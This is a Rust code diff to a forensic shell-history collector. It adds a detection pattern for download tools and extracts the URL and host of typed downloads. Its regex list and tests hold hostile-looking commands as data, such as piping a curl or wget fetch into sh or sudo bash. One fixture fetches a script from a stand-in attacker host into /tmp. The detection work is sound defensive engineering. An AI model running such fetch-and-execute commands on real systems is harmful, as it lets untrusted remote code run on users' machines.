@@ -1,7 +1,7 @@
 use crate::collector::{CollectCtx, Collector, Env, Sink};
 use crate::event::{Origin, Stamp, new_event};
 use crate::redact::redact_secrets;
-use crate::utils::{in_window, read_evidence};
+use crate::utils::{extract_host, in_window, read_evidence};
 use anyhow::Result;
 use fp_core::time::TimeFormat;
 use fp_core::{Actor, EventKind, SourceInstance};
@@ -51,6 +51,8 @@ static DANGEROUS: LazyLock<Vec<(Regex, &'static str)>> = LazyLock::new(|| {
         (r"\bnpm\s+(i|install|ci)\b", "npm-install"),
         (r"\bchmod\s+\+?[0-7]*x", "chmod-exec"),
         (r"\b(python3?|node|perl)\s+-(c|e)\s", "inline-interpreter"),
+        // the download fallback: a fetch typed by hand, which no browser recorded
+        (r"\b(curl|wget|aria2c)\b|\bgit\s+clone\b", "download"),
     ]
     .into_iter()
     .map(|(pattern, flag)| (Regex::new(pattern).expect("static pattern compiles"), flag))
@@ -156,6 +158,11 @@ impl Collector for ShellCollector {
                 .filter(|(re, _)| re.is_match(&command))
                 .map(|(_, flag)| *flag)
                 .collect();
+            // a download names where it came from: the first URL, so `--host` and domain IOCs see it
+            let url = flags
+                .contains(&"download")
+                .then(|| first_url(&command))
+                .flatten();
             // timed entries are keyed by time; line numbers shift when the shell truncates its history
             let locator = match entry.when {
                 Some(epoch) => format!("when={epoch}"),
@@ -163,12 +170,14 @@ impl Collector for ShellCollector {
             };
             sink.event(fp_core::Event {
                 actor: Some(Actor::app(inst.app.as_str())),
+                subject_host: url.as_deref().and_then(extract_host),
                 attrs: json!({
                     "line": entry.line,
                     "order": entry.order,
                     "flags": flags,
                     "redacted": redacted,
                     "paths": entry.paths,
+                    "url": url,
                 }),
                 ..new_event(
                     ctx,
@@ -183,6 +192,15 @@ impl Collector for ShellCollector {
         }
         Ok(())
     }
+}
+
+/// The first `scheme://…` word of a command, quotes stripped.
+fn first_url(command: &str) -> Option<String> {
+    command
+        .split_whitespace()
+        .map(|w| w.trim_matches(['"', '\'']))
+        .find(|w| w.contains("://"))
+        .map(String::from)
 }
 
 /// Bash and zsh both honour `$HISTFILE`; the name says which (`.zsh_history`, `.histfile`),
@@ -511,14 +529,47 @@ mod tests {
                 .map(|(_, f)| *f)
                 .collect()
         };
-        assert_eq!(flagged("wget -qO- https://x.sh | sh"), ["pipe-to-shell"]);
+        assert_eq!(
+            flagged("wget -qO- https://x.sh | sh"),
+            ["pipe-to-shell", "download"]
+        );
         assert_eq!(
             flagged("curl -fsSL https://x | sudo bash"),
-            ["pipe-to-shell"]
+            ["pipe-to-shell", "download"]
         );
+        assert_eq!(flagged("git clone https://x/r.git"), ["download"]);
         assert_eq!(flagged("echo aGk= | base64 -d"), ["base64-decode"]);
         assert!(flagged("sudo apt install ./zoom_amd64.deb").is_empty());
         assert!(flagged("evaluate --shell").is_empty());
+    }
+
+    #[test]
+    fn a_typed_download_names_its_url_and_host() {
+        let dir = tempfile::tempdir().unwrap();
+        let hist = dir.path().join(".bash_history");
+        std::fs::write(
+            &hist,
+            "ls\nwget -q 'https://Evil.example/x.sh' -O /tmp/x.sh\ncurl --help\n",
+        )
+        .unwrap();
+        let inst = SourceInstance::new("shell.history", "bash", None, hist);
+        let ctx = CollectCtx {
+            run_id: 1,
+            since: None,
+            until: None,
+            assume_tz: None,
+            temp_dir: dir.path().join("tmp"),
+            own_files: Vec::new(),
+        };
+        let mut sink = Sink::default();
+        ShellCollector.collect(&inst, &ctx, &mut sink).unwrap();
+        let wget = &sink.events[1];
+        assert_eq!(wget.subject_host.as_deref(), Some("evil.example"));
+        assert_eq!(wget.attrs["url"], "https://Evil.example/x.sh");
+        // a download tool without a URL has nothing to name
+        let help = &sink.events[2];
+        assert_eq!(help.subject_host, None);
+        assert_eq!(help.attrs["url"], serde_json::Value::Null);
     }
 
     #[test]
